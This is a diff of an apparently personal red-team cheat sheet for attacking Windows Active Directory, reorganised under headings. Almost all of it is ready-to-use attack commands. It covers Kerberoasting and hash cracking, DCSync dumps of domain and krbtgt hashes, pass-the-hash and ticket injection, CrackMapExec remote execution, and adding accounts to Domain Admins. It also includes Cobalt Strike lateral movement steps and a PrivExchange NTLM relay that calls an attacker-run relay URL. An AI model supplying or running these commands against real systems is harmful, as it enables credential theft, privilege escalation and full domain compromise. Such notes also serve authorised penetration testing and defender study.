@@ -1,42 +1,45 @@
-Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
-Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
+GhostPack Tools
+  Seatbelt.exe system|user (Opsec Tool)
+  SharpUp.exe (Privesc Tool)
+  SharpDump.exe (LSASS MiniDump Tool)
+  SharpView.exe (Network Enumeration)
+  SharpHound.exe CollectionMethod All (SearchForest or Domain) Throttle 20 Jitter 7 EncryptZip ZipFileName C:\temp\stuff.zip NoSaveCache
+  Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
+    Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
 
-make_token domain\user password
-rev2self
-
-dcsync fqdn domain\user (User must have DCSync rights in that domain)
+Overpass the Hash
+  dcsync fqdn domain\user (User must have DCSync rights in that domain)
   dcsync fqdn domain\krbtgt (golden ticket)
   dcsync fqdn (dump entire domain hashes)
-Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
+  Rubeus.exe asktgt /user:USER /enctype:AES256 /aes256:HASH /domain:FQDN /dc:DC_NAME /ptt
 
-Seatbelt.exe system|user (Opsec Tool)
-SharpUp.exe (Privesc Tool)
-SharpDump.exe (LSASS MiniDump Tool)
-SharpView.exe (Enumeration)
+CrackMapExec
+  crackmapexec IP_Address -u username -p='password' (Test if you have access)
+  crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
+    - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
+  crackmapexec IP -u username -H hash
 
-SharpHound.exe CollectionMethod All (SearchForest or Domain) Throttle 20 Jitter 7 EncryptZip ZipFileName C:\temp\stuff.zip NoSaveCache
+Net Commands
+  shell net user username /domain (query domain user)
+  shell net user username password /domain /add (Add User)
+  shell net group "Domain Admins" /domain
+  shell net group "Domain Admins" username /add /domain
+  
+Cobalt
+  make_token domain\user password
+  rev2self
+  pth (Will perform a Kerberos downgrade and could be detected)
+  Powershell-Import /path/to/ps1 file
+    - Get-GPPPassword
+  If admin you can inject into system process to become SYSTEM or another process
+  
+  Connect MetaSploit to Cobalt Listener
+    set lhost cobalt host
+    set lport cobalt listener
+    set prependmigrate true
+    set disablepayloadhandler true
 
-crackmapexec IP_Address -u username -p='password' (Test if you have access)
-crackmapexec IP -u username -p='password' (--exec-method smbexec) -X 'powershell cmd'
-  - Default exec-method is wmiexec; smbexec will drop as System and wmiexec as user/admin
-crackmapexec IP -u username -H hash
-
-Cobalt - pth (Will perform a Kerberos downgrade and could be detected)
-
-shell net user username /domain (query domain user)
-shell net user username password /domain /add (Add User)
-shell net group "Domain Admins" /domain
-shell net group "Domain Admins" username /add /domain
-
-Exchange PrivEsc
-  https://github.com/dirkjanm/privexchange
-  ## Modify the httattack.py script and change "attacker_url = 'http://dev.testsegment.local/myattackerurl/'" to the url of the attack box running ntlxrelayx 
-  ntlmrelayx.py -t ldap://fqdn.domain_controller --escalate-user <domain_user_name>
-  python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
-  # Windows Version
-   - http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html
-
-lateral movement
+Lateral Movement
   make_token username password
   shell dir \\system\c$ (Check if admin)
   shell net use \\system\c$
@@ -47,10 +50,10 @@ lateral movement
   exit original beacon
   verify no powershell is running
   
-Connect MetaSploit to Cobalt Listener
-set lhost cobalt host
-set lport cobalt listener
-set prependmigrate true
-set disablepayloadhandler true
-
-If admin you can inject into system process to become SYSTEM or another process
+PrivExchange 
+  https://github.com/dirkjanm/privexchange
+  ## Modify the httattack.py script and change "attacker_url = 'http://dev.testsegment.local/myattackerurl/'" to the url of the attack box running ntlxrelayx 
+  ntlmrelayx.py -t ldap://fqdn.domain_controller --escalate-user <domain_user_name>
+  python privexchange.py -ah <ntlmrelay-url-path> <fqdn.exch-server> -u <domain_user_name> -d <fqdn.domain-name>
+  # Windows Version
+   - http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html
